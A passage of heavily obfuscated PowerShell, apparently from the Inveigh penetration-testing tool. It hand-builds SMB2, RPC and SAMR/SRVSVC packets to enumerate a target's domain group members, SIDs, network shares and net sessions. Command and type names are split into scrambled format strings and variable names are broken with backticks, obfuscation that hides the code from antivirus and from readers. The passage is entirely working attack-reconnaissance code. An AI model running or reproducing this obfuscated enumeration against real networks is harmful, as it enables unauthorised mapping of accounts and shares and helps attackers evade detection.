                        ${sm`B_`DatA} = &("{3}{1}{5}{6}{7}{2}{0}{4}"-f'ona','ve','i','Con','ry','rtFr','om-Packet','OrderedDict') ${PACk`et`_sm`B_DA`Ta} 
                        ${rpC`_Da`TA_l`engTh} = ${S`M`B_d`AtA}."L`ENG`TH" + ${R`p`C`_dATA}."lE`NGTh" + ${S`Amr_d`Ata}."Le`NGth"
                        ${pACk`eT_`Ne`TbIoS_s`ESSi`O`N_sERvi`cE} = &("{7}{0}{3}{4}{6}{2}{1}{5}" -f 'ew','rvi','sionSe','-Pack','etNe','ce','tBIOSSes','N') ${SM`B_hEaD`er}."LEn`GtH" ${RpC_`Dat`A`_Len`GtH}
                        ${NET`BIoS_`seSsioN_`s`eRV`ICE} = &("{6}{7}{1}{10}{0}{4}{5}{8}{3}{2}{9}"-f 'PacketO','rom','io','dDict','rde','r','Conv','ertF','e','nary','-') ${P`A`CkET_Ne`TBI`OS_S`e`S`s`iON_sERviCe}
                        ${Cl`iEnT`_send} = ${nEtBios`_`seSsI`ON_S`eR`VIcE} + ${smb`_H`E`ADeR} + ${Smb_`dA`TA} + ${Rp`C`_daTa} + ${saMR_`Da`TA}
                        ${st`A`GE} = ("{2}{1}{0}"-f've','ecei','SendR')
                    }

                    ("{1}{0}{2}" -f 'Do','Open','main')
                    {    
                        ${meSs`A`g`E_ID}++
                        ${sTa`GE_CuR`R`e`NT} = ${stA`gE}
                        ${pa`CK`eT_SM`B_HEAdeR} = &("{3}{1}{0}{2}{5}{4}"-f 'B','tSM','2Hea','New-Packe','er','d') 0x0b,0x00 0x01,0x00 ${smb_s`IG`Ni`Ng} ${M`eS`Sage_`ID} ${PR`OCe`Ss_ID} ${t`R`ee_iD} ${sESsio`N_`id}
                        ${pAc`KEt`_S`A`mr_`DATa} = &("{4}{1}{5}{0}{3}{6}{2}"-f 'SAMROpenD','Pa','n','om','New-','cket','ai') ${SAmR_cONN`eCt_H`AnD`Le} ${s`iD_Co`UnT} ${lsA_`DOMAI`N_`s`iD}
                        ${s`A`MR_daTa} = &("{4}{2}{1}{6}{3}{9}{0}{7}{8}{5}{10}" -f 'dDict','r','nvertF','O','Co','a','om-Packet','io','n','rdere','ry') ${PaCK`eT_`samR_`daTa} 
                        ${P`ACkEt_s`mb`_Data} = &("{4}{1}{5}{3}{7}{2}{0}{6}"-f 'es','w-PacketS','equ','ctl','Ne','MB2Io','t','R') 0x17,0xc0,0x11,0x00 ${F`I`Le_iD} ${S`AM`R_DaTA}."l`eNGTH" 4280
                        ${p`ACKeT_R`pC_data} = &("{5}{0}{2}{4}{1}{3}"-f'ew-Packet','s','RPCReq','t','ue','N') 0x03 ${S`A`mR_D`AtA}."l`engtH" 0 0 0x07,0x00,0x00,0x00 0x00,0x00 0x07,0x00
                        ${rpc_`d`ATA} = &("{6}{8}{1}{9}{5}{3}{0}{7}{2}{4}"-f'dD','tFrom-Pa','a','rdere','ry','ketO','Conve','iction','r','c') ${PA`cKet_`Rpc_`DA`Ta}
                        ${S`Mb_HE`AD`ER} = &("{5}{1}{0}{4}{6}{8}{2}{7}{3}"-f 'From-','onvert','ctio','y','P','C','acketOrdere','nar','dDi') ${paCkEt_`Smb_`Head`ER}
                        ${S`mb_Da`Ta} = &("{0}{5}{2}{1}{7}{6}{4}{3}"-f 'Con','-P','rom','ary','on','vertF','tOrderedDicti','acke') ${PAc`KET_s`Mb_d`Ata} 
                        ${r`p`c_`dATA_lENgTh} = ${S`mb_dA`TA}."lEn`gTH" + ${Rpc`_d`AtA}."LE`N`GTh" + ${SA`Mr_`da`Ta}."Le`N`Gth"
                        ${packET_`N`EtbioS_SE`Ss`ioN`_Ser`V`ICe} = &("{2}{4}{1}{0}{3}{6}{5}"-f 'ssion','Se','New-PacketNetBI','Se','OS','ce','rvi') ${s`m`B`_heaDER}."lEN`gtH" ${Rp`C_d`Ata_`lE`NgTH}
                        ${nEtbi`oS_SeSsIOn`_`sEr`Vice} = &("{3}{2}{1}{5}{0}{4}{6}{7}"-f 'tOrde','vertFrom-Pack','on','C','redDictio','e','na','ry') ${Pa`CKet_NeTbiOS_Se`s`S`IOn_SE`RvIcE}
                        ${Cl`IeNT_SE`Nd} = ${NEtBi`OS_se`ss`I`o`N_S`Er`VicE} + ${S`MB_H`eAder} + ${Smb_`dA`TA} + ${rpc_D`A`Ta} + ${S`AMR_D`ATA}
                        ${ST`A`gE} = ("{0}{2}{3}{1}" -f 'S','ceive','e','ndRe')
                    }

                    ("{1}{0}"-f'roup','OpenG')
                    {
                        ${Me`sS`AG`e_ID}++
                        ${Stage_`C`U`RREnt} = ${S`T`AGE}
                        ${p`ACKet_sm`B_HE`ADer} = &("{0}{1}{2}{3}" -f 'N','ew-','PacketSMB2','Header') 0x0b,0x00 0x01,0x00 ${sMB_`Si`Gn`iNg} ${MeSS`A`GE_Id} ${p`R`OCEss_ID} ${tRE`E_`ID} ${s`ESSiOn_`id}
                        ${P`Ack`ET_samr_da`TA} = &("{4}{0}{3}{2}{1}"-f'w-','p','SAMROpenGrou','Packet','Ne') ${saMR_`D`OMA`I`N_Ha`NdLE} ${sa`M`R_RID}
                        ${SA`MR_d`Ata} = &("{5}{4}{6}{8}{3}{7}{0}{1}{2}" -f'i','ona','ry','redD','vertFrom-','Con','Packe','ict','tOrde') ${PA`Cket_sA`M`R_dATa} 
                        ${PaCkE`T_rPc_D`ATa} = &("{2}{3}{1}{4}{0}" -f'est','t','N','ew-Packe','RPCRequ') 0x03 ${Sam`R_`da`Ta}."lenG`TH" 0 0 0x09,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                        ${P`Ac`kEt_sMB_`d`ATa} = &("{5}{6}{1}{0}{3}{7}{2}{4}"-f 'S','cket','tlReq','M','uest','New','-Pa','B2Ioc') 0x17,0xc0,0x11,0x00 ${F`iLe_`iD} ${SAM`R`_daTA}."LeN`g`Th" 4280
                        ${rP`c`_da`TA} = &("{0}{7}{1}{4}{2}{6}{3}{5}" -f'Conv','rom-PacketO','ic','ion','rderedD','ary','t','ertF') ${pa`c`k`et_rPC_DaTa}
                        ${SM`B_HEAD`er} = &("{6}{1}{2}{4}{0}{3}{5}" -f'edDi','m-Pa','cketOrd','c','er','tionary','ConvertFro') ${pAckeT_S`mb_h`EAD`er}
                        ${sm`B_D`ATA} = &("{8}{5}{4}{2}{3}{0}{1}{7}{6}" -f 'r','dered','et','O','-Pack','rom','ionary','Dict','ConvertF') ${pa`cK`et_sMB`_D`A`TA} 
                        ${rp`C_`dAtA_leng`Th} = ${smB_da`TA}."LE`NgTh" + ${r`pC_daTa}."lE`Ngth" + ${SAmr`_D`A`TA}."LenG`TH"
                        ${P`ACk`Et_nE`T`BIO`S_ses`sIoN_`SeR`ViCE} = &("{6}{0}{2}{4}{3}{5}{7}{1}" -f'Pac','e','ketNet','ession','BIOSS','Serv','New-','ic') ${S`mb_`H`EAdeR}."l`ength" ${Rpc`_dA`T`A_LEN`GTH}
                        ${Ne`TB`IOs`_SEs`s`iON_s`eRVIce} = &("{7}{2}{1}{0}{6}{5}{3}{4}"-f 'Order','Packet','rom-','ar','y','on','edDicti','ConvertF') ${PacKET_nETbI`oS_se`SS`Ion`_s`eR`Vi`Ce}
                        ${cLIEnT_`s`END} = ${NETbiOs`_SeSS`io`N_`SErV`i`Ce} + ${s`mb`_hEADeR} + ${sMB_d`A`TA} + ${r`PC_`daTA} + ${SA`MR_D`Ata}
                        ${st`A`gE} = ("{3}{2}{0}{1}" -f'i','ve','e','SendRec') 
                    }

                    ("{2}{1}{4}{3}{0}" -f 'Rids','s','Par','kup','eLoo')
                    {
                        [Byte[]]${reSpOnSE`_uSe`R_`CoUNT_`BYTeS} = ${Cl`Ien`T_reC`eiVe}[140..143]
                        ${rE`spoNse_`USEr`_coU`NT} =   (&('ls')  ("VARIAb"+"l"+"e:xV8Q"+"n"+"B")  ).valUE::("{1}{2}{0}" -f '6','ToIn','t1').Invoke(${R`espOnse`_u`Se`R_cOU`Nt_bYteS},0)
                        ${ReSPOn`se_Us`e`R_S`Tart} = ${ResP`oNSe_`UsEr`_cO`Unt} * 8 + 164
                        ${RE`sP`OnSE`_User`_eND} = ${rEspOnsE`_`U`s`E`R_StaRt}
                        ${RESPOns`e`_`U`SeR_LE`N`g`Th_STa`Rt} = 152
                        ${i} = 0

                        while(${i} -lt ${r`esPONSe`_uS`e`R_cOunT})
                        {
                            ${RES`ponS`e_`USer`_OBJE`Ct} = &("{2}{1}{0}"-f 'w-Object','e','N') ("{2}{0}{1}" -f'O','bject','PS')
                            [Byte[]]${ReSpoNs`e_U`S`e`R_le`N`gth_`BYTes} = ${CLIEN`T_R`eC`eIvE}[${RESPONsE`_`USeR_lEnG`TH_`S`TarT}..(${RE`sPoN`sE`_`USEr_lENG`TH_sTArt} + 1)]
                            ${rES`pONse_`U`Se`R_leNGTh} =   (&("{0}{1}"-f 'I','TeM')  ('vAri'+'aBL'+'E:xV8'+'QNb') ).vAlue::("{0}{1}" -f 'ToIn','t16').Invoke(${resp`oNS`e_uSe`R_`Le`NGtH`_BYteS},0)
                            ${rESp`ONsE_User`_`E`Nd} = ${rEsPOns`E_uSE`R_s`TArt} + ${RES`pOnS`e_u`SeR_le`NGTh}
                            [Byte[]]${rEsPOn`S`E_`ActU`Al_`C`oUnt_BY`TES} = ${c`lieN`T_Re`ceive}[(${Re`SPo`Nse`_USer_stArT} - 4)..(${R`e`S`PO`NSe_u`ser_S`TArT} - 1)]
                            ${rE`s`PonSE_`ACTUAl_COu`NT} =  (&("{3}{0}{2}{1}"-f'v','Ble','aRIA','GET-')  ("Xv8QN"+"B") -valUe )::("{2}{0}{1}"-f'nt','16','ToI').Invoke(${re`sPONSE`_aCT`U`AL_cOun`T`_BytES},0)
                            [Byte[]]${ReSP`oNSE_`USe`R_By`TeS} = ${clIEnT_`ReC`Ei`Ve}[${ReSponSE_US`er_`sT`Art}..(${REs`poNsE_u`Ser_e`Nd} - 1)]
                            
                            if(${r`ESP`OnsE`_aCtu`Al_co`UNT} % 2)
                            {
                                ${RES`P`ONSe`_`USEr_sTarT} += ${rESPo`Nse_USer_L`EN`GTH} + 14
                            }
                            else
                            {
                                ${RESpo`Ns`e_usE`R_staRt} += ${Re`spo`NSe_us`eR_leNgTH} + 12
                            }

                            ${R`esp`onSe_u`seR} =   ( &("{0}{2}{1}" -f 'v','Le','aRIAB')  ("XV"+"8QNb")).valUE::("{0}{1}{2}"-f'To','S','tring').Invoke(${R`esP`ONse_USeR_b`yT`es})
                            ${Re`S`PoNs`E_uSER} = ${rESPons`e_U`SEr} -replace "-00",""
                            ${RES`p`ons`E`_useR} = ${R`E`SpoNSE`_`UsER}.("{0}{1}" -f'Spl','it').Invoke("-") | &("{1}{3}{2}{0}"-f'ct','ForE','e','ach-Obj'){[Char]  (&('Ls')  varIABLE:4Vxn).VALue::("{0}{1}" -f'ToI','nt16').Invoke(${_},16)}
                            ${Re`S`pONs`e_USeR} = &("{2}{0}{1}" -f 'ew','-Object','N') ("{4}{1}{2}{3}{0}"-f'ng','m.S','t','ri','Syste') (${RE`sp`oNse_uSeR},0,${rES`p`O`NsE_U`seR}."lE`Ngth")
                            ${Res`pon`Se`_U`s`E`R_l`ENgTh_`sTARt} = ${rE`S`Pon`se_us`eR_l`EN`GTH_STARt} + 8
                            ${I}++
                        }
                        
                        ${S`TAGe} = ("{2}{0}{1}" -f'eques','t','CloseR')
                    }

                    ("{1}{0}{2}" -f'arseLookupSi','P','ds')
                    {
                        [Byte[]]${res`p`onSe_D`OMai`N_COuNt_B`Y`TEs} = ${cL`IEn`T_Rec`Ei`VE}[144..147]
                        ${Re`SPO`NS`e_DomAin_Cou`Nt} =   (&("{1}{0}{2}" -f'ARiA','V','ble') XV8qNB  ).VaLue::("{2}{0}{1}" -f'1','6','ToInt').Invoke(${r`ESpoN`sE_`DOMA`in_CoUnt_by`TES},0)
                        ${R`E`Sp`o`NSE_`DoMAiN_STArt} = ${Re`Sp`OnSE`_d`OMAi`N_COunt} * 12 + 172
                        ${rEsPonS`E_d`o`m`Ai`N_eNd} = ${RESponsE_DO`M`Ai`N_StarT}
                        ${reS`Pon`S`E_dOMaI`N_L`EngTh`_s`T`ArT} = 160
                        ${ENu`meratE_`GrO`UP_usER`_L`I`st} = &("{0}{1}{2}" -f'Ne','w-Obje','ct') ("{2}{7}{8}{4}{0}{6}{1}{5}{3}"-f'o','A','S','st','ti','rrayLi','ns.','ystem','.Collec')
                        ${ENu`mE`Rate`_`GRoU`P_G`RouP_LIsT} = &("{2}{1}{0}" -f 'ject','-Ob','New') ("{3}{4}{1}{2}{0}" -f 'yList','ions','.Arra','System.Coll','ect')
                        ${rEs`PONS`e_DO`maIn_`lIst} = @()
                        ${i} = 0

                        while(${I} -lt ${res`poNs`e_D`OmA`i`N_Cou`NT})
                        {
                            [Byte[]]${r`ES`Po`NSE_d`OMaIn`_LE`NGtH_`B`yTES} = ${c`liEnt`_rEce`ive}[${Re`Sp`onSE_d`oM`Ai`N_lenGT`h`_StaRt}..(${ResPO`N`S`E`_Domain`_LeNgt`H_sTART} + 1)]
                            ${r`espons`e_`DO`maIn`_LENGtH} =   (  &("{0}{1}{2}"-f 'vAr','I','AblE')  xv8qNB ).VAlUE::("{0}{2}{1}"-f 'T','Int16','o').Invoke(${reSPonse`_D`om`A`In_lEn`gth_ByTes},0)
                            ${rEsPoN`s`E_D`OMaIN_e`ND} = ${RespO`NSE`_`doMAIn_Sta`RT} + ${ReSponse`_D`OMAi`N_LeN`G`Th}
                            [Byte[]]${RES`P`OnSE_a`CTu`Al`_cOuNt_bY`TEs} = ${CLI`eNt_r`eCeI`Ve}[(${r`eS`p`ONS`E_d`OMAIN`_stART} - 4)..(${RE`s`ponsE_D`O`MAIN_s`Ta`Rt} - 1)]
                            ${Re`s`P`ON`sE_AcTual_cOUnt} =   ( &("{0}{1}"-f 'gc','i') vArIAbLE:XV8Qnb  ).value::("{0}{2}{1}"-f'ToI','t16','n').Invoke(${r`ESPONse_ACtua`L_COunt_bY`T`eS},0)
                            [Byte[]]${re`SP`o`N`se_doM`Ain_byT`ES} = ${C`Lien`T_Re`c`eIve}[${REsPoNS`e_domAI`N`_sTA`RT}..(${rEs`Po`NSe`_DomaIN`_e`Nd} - 1)]
                            
                            if(${REsPONs`e_`Act`U`Al_cOU`NT} % 2)
                            {
                                ${re`SpONS`e`_`DOm`Ain_STA`RT} += ${rESpOnsE_d`OM`A`in_L`ENgth} + 42
                            }
                            else
                            {
                                ${RE`SPonse_d`oM`AIN_`ST`A`Rt} += ${resPoNSe`_`D`oma`In_`l`enGtH} + 40
                            }

                            ${r`e`SpOnsE_domA`in} =  (&("{2}{3}{1}{0}" -f 'Le','b','geT-v','ArIa') ("X"+"v8"+"QNB")  -VaLUEO )::("{2}{1}{0}"-f 'ing','Str','To').Invoke(${Re`SpOns`E`_doM`AIN`_B`yteS})
                            ${R`EsponS`E_domAin} = ${R`e`SponSe_dO`mA`In} -replace "-00",""
                            ${R`e`S`poNse`_DoMA`In} = ${REs`poNsE_`dOm`Ain}.("{0}{1}" -f'S','plit').Invoke("-") | &("{0}{2}{3}{4}{1}" -f 'ForE','Object','ac','h','-'){[Char] $4vXN::("{0}{1}{2}" -f'ToInt','1','6').Invoke(${_},16)}
                            ${REsPONS`e_`do`M`AIn} = &("{1}{2}{0}" -f'ct','New-Obj','e') ("{0}{1}{3}{2}" -f'S','yst','g','em.Strin') (${ResP`On`S`e`_doMa`iN},0,${res`PoN`Se`_DOMa`iN}."l`e`NgtH")
                            ${r`esPOn`S`e_domaIN`_liSt} += ${ReSp`oN`SE_Do`ma`In}
                            ${R`eS`PONS`E`_domAI`N_leNG`T`H_STA`RT} = ${rEsPO`Nse`_D`o`maIn_LEnGT`H_`st`A`Rt} + 12
                            ${i}++
                        }

                        [Byte[]]${rES`p`On`sE`_USEr`_cOuNT_b`y`T`es} = ${ClI`ENt_r`Ec`Ei`Ve}[(${REs`PoN`se`_dom`AIN_S`TARt} - 4)..(${RE`SP`OnS`e_d`OMa`In_Start} - 1)]         
                        ${RE`S`p`onSE_UsER_cOUNt} =  $XV8qnb::("{1}{2}{0}"-f 't16','T','oIn').Invoke(${re`SPonSe`_usE`R_coUNt_bYt`Es},0)
                        ${r`e`S`PoNse_UsER`_STarT} = ${RESPOnSE`_`U`sEr_`COUnT} * 16 + ${R`ES`P`onsE_`DO`MAi`N_staRt} + 12
                        ${resP`ON`se_U`se`R_eNd} = ${r`ES`P`OnSe_`US`er_StArT}
                        ${rEs`p`oNse_U`seR_`lengTh_sT`A`RT} = ${REsPoN`Se_doM`Ain`_`S`TA`Rt} + 4
                        ${i} = 0

                        while(${I} -lt ${R`eS`Po`NSE_uSe`R_C`oUnt})
                        {
                            [Byte[]]${RESPOnsE`_uS`eR_Typ`E`_BYt`es} = ${cL`Ient_`REcEIVE}[(${ResPON`se_uSER`_`lE`NGt`h_S`TArt} - 4)]
                            [Byte[]]${r`espoNSe`_uSE`R`_LeN`g`Th_BY`Tes} = ${clI`E`Nt_r`ecEIVe}[${rEsP`O`Nse_usEr`_lenG`TH_`S`TarT}..(${res`po`NS`e_USeR_leN`gTh`_s`TaRT} + 1)]
                            ${rEsPONse`_uS`e`R_L`e`NgtH} =   (  &('ls') vARiAbLE:xV8qnB  ).VALuE::("{0}{1}"-f 'ToInt1','6').Invoke(${Res`p`OnSe_us`er_L`e`Ngt`H_`Bytes},0)
                            ${Re`s`POnse_SID_`iN`d`e`X_sTART} = ${res`P`o`Nse`_UsER`_LEN`Gth_`STARt} + 8
                            [Byte[]]${r`ESPO`NSE_`sID_`I`NDex_by`Tes} = ${C`LIent_R`EC`E`ivE}[${reS`POn`S`e_SID_`inDEX`_Sta`Rt}..(${RES`po`N`s`e_S`ID_i`Ndex_sTaRT} + 3)]
                            ${R`espONse_si`d_`IN`DEx} =  ( &("{2}{0}{1}{3}"-f'eT','-','G','cHILditEm') ("variable:X"+"v8"+"QN"+"B")).vAlue::("{2}{0}{1}"-f'oI','nt16','T').Invoke(${r`eS`POnse_s`iD`_In`deX`_ByTES},0)
                            ${REsp`oN`SE`_uS`er_eNd} = ${res`Po`NSE_UsER`_`staRT} + ${r`EsP`o`NSe_UsER`_L`eng`Th}
                            [Byte[]]${resPonsE_`ACtu`Al_CoUnt_`BYt`Es} = ${C`LIE`N`T_r`eCeIvE}[(${rE`SPOnSe_us`Er_`stART} - 4)..(${R`es`P`ONSe`_`USer_`StArt} - 1)]
                            ${re`SPO`NsE_ActuAL_CO`U`Nt} =  $XV8QNb::("{0}{1}{2}"-f 'T','oIn','t16').Invoke(${ReSP`oNSe`_AcTU`Al_C`ouNt_Byt`ES},0)
                            [Byte[]]${R`EsPONSE_UsE`R_`ByTeS} = ${c`l`iE`Nt_RECEIvE}[${reS`pONs`E_usER`_s`Ta`Rt}..(${Respo`N`SE_User_e`ND} - 1)]

                            if(${rEs`pON`s`E_ACTUal_`C`o`UnT} % 2)
                            {
                                ${rEsPONS`e`_`UsE`R_STArT} += ${r`ES`poN`Se_USeR`_lenGTH} + 14
                            }
                            else
                            {
                                ${rEs`P`O`NS`E_UsER_st`ART} += ${ReSPO`NsE_`U`sER`_lEN`GTH} + 12
                            }

                            ${rESPON`se`_`USEr} =  $XV8QNB::("{0}{1}"-f 'ToStri','ng').Invoke(${reSPo`NsE_uSEr_b`y`TEs})
                            ${rE`sPONsE`_`USer} = ${Re`s`p`oN`se_UseR} -replace "-00",""
                            ${REspon`S`E_USer} = ${R`ESPOnse`_u`s`Er}.("{1}{0}"-f 't','Spli').Invoke("-") | &("{0}{2}{1}"-f'For','h-Object','Eac'){[Char] ( &("{1}{2}{0}"-f'Em','ChiL','dIt')  vaRiabLe:4VXn  ).VaLue::("{1}{0}"-f 'nt16','ToI').Invoke(${_},16)}
                            ${r`e`S`POnSE`_usEr} = &("{1}{2}{0}"-f'ect','New','-Obj') ("{0}{1}{2}"-f 'System.St','ri','ng') (${rE`S`p`oNSE_uSer},0,${REspOn`SE_`USeR}."L`EnGtH")
                            ${Re`SPonsE_U`s`er_LE`Ngth_`s`TaRt} = ${rESpo`N`Se_`USe`R_LengtH_StaRt} + 16
                            ${ResPONS`e_`AdmIn`iStRAt`Or} = ${RESpon`s`e_Domain`_L`isT}[${REs`poNsE`_sID`_i`N`Dex}] + "\" + ${reS`pOnS`e_U`sEr}

                            if(${rE`sponsE_Use`R_TyPE_b`YT`ES} -eq 1)
                            {
                                ${EnUm`e`Ra`Te`_gr`OUP_User_lI`st}.("{0}{1}"-f 'Ad','d').Invoke(${R`espONSe_A`Dm`iN`iStR`At`OR}) > ${NU`LL}
                            }
                            else
                            {
                                ${eNu`Mer`Ate_GrOUP_GRo`Up_LI`st}.("{1}{0}" -f'dd','A').Invoke(${rEsPOn`Se_a`DMi`Ni`st`R`AtOR}) > ${NU`lL}
                            }
                            
                            ${i}++
                        }

                        if(${EN`UmEr`AT`E`_gRoup_user_LIsT} -gt 0)
                        {
                            ${inVE`I`gh}."oU`T`p`Ut_qUeUE"."A`Dd"(("[+] [$(Get-Date -format s)] $target $EnumerateGroup group member users: ")) > ${NU`LL}
                            ${inV`eIGH}."ouT`Put_Q`UEUE".("{1}{0}" -f'dd','A').Invoke(${enume`Rate_grOUP_U`SEr_`LI`ST} -join ",") > ${nu`Ll}
                        }

                        if(${eNu`Me`RATE_`GR`Ou`P_grou`p_lI`St} -gt 0)
                        {
                            ${iNV`eIGH}."o`UTPuT_q`UE`UE"."a`dd"(("[+] [$(Get-Date -format s)] $target $EnumerateGroup group member groups: ")) > ${nu`ll}
                            ${I`NVE`iGh}."Out`PUt_Q`U`eUe".("{1}{0}"-f 'dd','A').Invoke(${E`NUmer`AT`E_GROU`p_`g`ROUp_l`Ist} -join ",") > ${n`UlL}
                        }

                        ${sTa`GE} = ("{3}{1}{2}{0}" -f 't','equ','es','CloseR')
                    }

                    ("{1}{0}{2}{3}"-f 'ar','P','seSRVS','VC')
                    {
                        ${RESpo`NSe_`obJ`eCt_`L`Ist} = @()
                        ${s`Har`e_L`ISt} = @()
                        [Byte[]]${ResP`onS`e_Coun`T_b`YTes} = ${CLiENT`_R`ec`EI`Ve}[152..155]
                        ${RESP`Onse_`CO`Unt} =  (&("{0}{2}{1}" -f 'v','e','ARIABl')  ('xV8QN'+'B')).ValUE::("{0}{2}{1}"-f 'ToI','2','nt3').Invoke(${RE`SpO`NsE_Co`U`N`T`_byTes},0)
                        ${Re`sPONse_Item`_I`Nd`EX} = 164

                        if(${aCtIO`N_S`TaGe} -eq ("{0}{1}" -f'Sh','are'))
                        {
                            ${enuME`Rat`E`_S`hARe`_liST} = &("{2}{1}{0}" -f'ject','ew-Ob','N') ("{3}{8}{4}{7}{1}{5}{0}{6}{2}"-f'Ar','lec','t','Syst','o','tions.','rayLis','l','em.C')
                        }
                        else
                        {
                            ${En`U`MERate_N`e`Ts`e`Ss`IoN_lIst} = &("{2}{1}{0}" -f'ct','w-Obje','Ne') ("{3}{6}{1}{0}{8}{4}{7}{2}{5}" -f 's','n','yL','System.Colle','Ar','ist','ctio','ra','.')
                        }
                        
                        ${i} = 0

                        while(${i} -lt ${reS`po`NS`e_`CounT})
                        {

                            if(${I} -gt 0)
                            {

                                if(${r`ES`PoN`S`E`_iTEM_LeN`gth} % 2)
                                {
                                    ${r`E`s`Pon`Se_`ItEM`_INDex} += ${R`ESpON`S`E`_I`TE`m_lENgth} * 2 + 2
                                }
                                else
                                {
                                    ${RESp`On`se_IT`eM_i`N`dEx} += ${REspo`N`S`E_I`TEm_lenG`Th} * 2
                                }

                            }
                            else
                            {
                                
                                if(${AcTIo`N_`STa`gE} -eq ("{1}{0}"-f're','Sha'))
                                {
                                    ${rESPO`NS`E_ITem`_iN`D`Ex} += ${r`eS`ponSE_c`ouNt} * 12
                                }
                                else
                                {
                                    ${RE`S`ponSE_itE`m_i`ND`ex} += ${rEsp`on`SE_C`O`UNt} * 16
                                }

                            }

                            [Byte[]]${ReS`P`ONsE`_itEm_Le`NG`TH_bYteS} = ${clIeNT`_RE`cei`VE}[${res`Pons`E`_`ITem_i`NDEx}..(${rESPO`NS`e_`i`Te`M_inDEX} + 3)]
                            ${r`esPO`Nse_It`EM_L`En`gTh} =   $xV8qNb::("{1}{0}" -f'2','ToInt3').Invoke(${re`s`P`onSE_`it`eM_`LENGtH`_ByteS},0)
                            ${rEsPon`s`E_It`e`m_ind`ex} += 12
                            [Byte[]]${r`E`SpOnSe_i`T`Em_By`TeS} = ${CL`ieN`T_R`e`CEIVe}[(${Re`spoNSE_I`T`Em`_InDEx})..(${r`EsPOnse_`I`TeM`_i`N`DEx} + (${r`eSP`ONSE_itEm_l`EN`GTh} * 2 - 1))]
                            ${REs`pONsE_I`T`em} =  $xV8qnb::("{1}{0}{2}" -f'Strin','To','g').Invoke(${R`eSP`O`N`SE_I`TEM_bYTes})
                            ${r`e`SpONS`e_Item} = ${r`EspONsE_I`TEm} -replace "-00",""
                            ${RES`p`O`NSE_itEM} = ${ResPoN`SE_`i`TEm}.("{0}{1}"-f'Sp','lit').Invoke("-") | &("{2}{1}{3}{0}" -f'ct','orEa','F','ch-Obje'){[Char]  (  &('GI') ("va"+"rIABlE:"+"4V"+"XN") ).VaLuE::("{0}{1}{2}" -f'ToI','n','t16').Invoke(${_},16)}
                            ${rESpoN`s`e`_`iTEM} = &("{1}{0}{2}" -f'b','New-O','ject') ("{0}{3}{2}{1}" -f 'Syst','String','.','em') (${r`e`Spo`N`Se_ItEM},0,${rEspOn`Se_`iTEM}."lEN`gTh")
                            
                            if(${R`esPONS`E`_`iTEM_L`eNgTh} % 2)
                            {
                                ${res`pONSe_i`TE`M_indEX} += ${rEsp`ons`E`_iTE`M_`l`EnGTh} * 2 + 2
                            }
                            else
                            {
                                ${r`eSpONSe_ITem_In`D`Ex} += ${R`esp`o`N`se_itEM_`len`GtH} * 2
                            }
                            
                            [Byte[]]${RESpONS`e`_itEM`_lENG`Th_`B`y`Tes} = ${c`liE`NT_r`ECeI`VE}[${RE`sPO`N`sE_iteM_INdEX}..(${RE`spON`Se`_i`T`eM_I`NDEx} + 3)]
                            ${Re`sp`O`NsE_`iT`Em_`LEngTh} =   $Xv8qnb::("{2}{0}{1}"-f't3','2','ToIn').Invoke(${r`ESPOnSe_Ite`m_`LEn`GTh_`BYTeS},0)
                            ${rESPOnSe_it`Em`_`InDEX} += 12
                            [Byte[]]${reSP`ONS`E_it`EM_2_`ByTeS} = ${cL`I`eNT`_`ReCeive}[(${Re`SPOnSE`_itEM_iN`d`eX})..(${Re`SPO`NSe_iTE`M_i`Nd`eX} + (${RES`PO`NsE_Ite`m_l`en`gTH} * 2 - 1))]
                            ${rEs`pO`N`sE_iTem_2} =   (&("{0}{1}" -f'vARi','aBlE')  xv8QNb -vaLue)::("{0}{2}{1}"-f'ToSt','ng','ri').Invoke(${rE`Spo`Ns`E_It`e`m_2_bYT`es})
                            ${R`E`Sp`Onse_IteM_2} = ${rE`s`pONSE_I`TeM_2} -replace "-00",""
                            ${ReSpONse_I`Te`M`_2} = ${re`SPoN`s`e_iTE`m_2}.("{1}{0}"-f'lit','Sp').Invoke("-") | &("{0}{2}{3}{1}" -f'For','t','Each-Ob','jec'){[Char] (  &("{2}{0}{1}{3}" -f 'VaRi','ab','gEt-','lE')  4VXn  ).VaLuE::("{0}{1}" -f 'To','Int16').Invoke(${_},16)}
                            ${RE`SPoNse`_`ite`m_2} = &("{2}{0}{1}"-f'ew-Obje','ct','N') ("{2}{3}{0}{1}" -f'stem.Stri','ng','S','y') (${re`sPoNSe_item`_2},0,${RE`SPO`N`Se_ItE`m_2}."LENg`Th")

                            if(${aCT`iOn`_sTaGe} -eq ("{0}{1}"-f 'Sh','are'))
                            {

                                if(${REs`pONsE`_I`TEM} -ne ((('A'+'D'+'M'+'INL19')  -rePlaCE  'L19',[chaR]36)) -and ${rESPO`NSE_it`EM} -notmatch ((('^[a-'+'zA-Z'+'][EWsX'+'Uh]'+'XUh')  -REplACe ([char]88+[char]85+[char]104),[char]36 -cREpLace  ([char]69+[char]87+[char]115),[char]92)) -and ${res`p`oNSe_item} -ne (('I'+'PChpK')."r`eplACe"(([chaR]104+[chaR]112+[chaR]75),[sTRIng][chaR]36)) -and ${rE`SpoNs`E_`iTem} -ne ((('printM'+'4i')-rEPlAcE([CHAr]77+[CHAr]52+[CHAr]105),[CHAr]36)))
                                {
                                    ${eN`U`me`RAT`e`_ShAre_LIst}.("{1}{0}" -f 'd','Ad').Invoke(${R`eSPon`SE_`iT`Em}) > ${N`Ull}
                                }
                                
                            }
                            else
                            {

                                if(${reS`PON`sE`_i`TEm} -ne "\\" + ${cl`i`enT}."C`LIe`Nt"."lOcaLEN`dP`oint"."Add`RESS"."IpA`DdRE`Ss`TOS`Tr`iNg")
                                {
                                    ${ENumeRAt`E_`NE`Tse`sSiOn_lIsT}.("{1}{0}" -f'd','Ad').Invoke(${RE`spONSE_it`em} + "\" + ${REs`P`ONSE_iTE`M`_2}) > ${N`ULL}
                                }

                            }

                            ${I}++
                        }

                        if(${e`NUMe`Rate_S`h`ARE`_LisT}."c`OuNT" -gt 0 -and ${AcT`i`ON_sT`AgE} -eq ("{1}{0}"-f're','Sha'))
                        {
                            ${I`NveI`Gh}."OUT`Pu`T`_queUE"."a`dd"(("[+] [$(Get-Date -format s)] $target custom shares: ")) > ${NU`ll}
                            ${iNV`e`IgH}."OUTpUT_`Que`UE".("{0}{1}"-f 'Ad','d').Invoke(${E`NU`MErAT`E`_SHare`_LIsT} -join ",") > ${n`ULl}
                        }

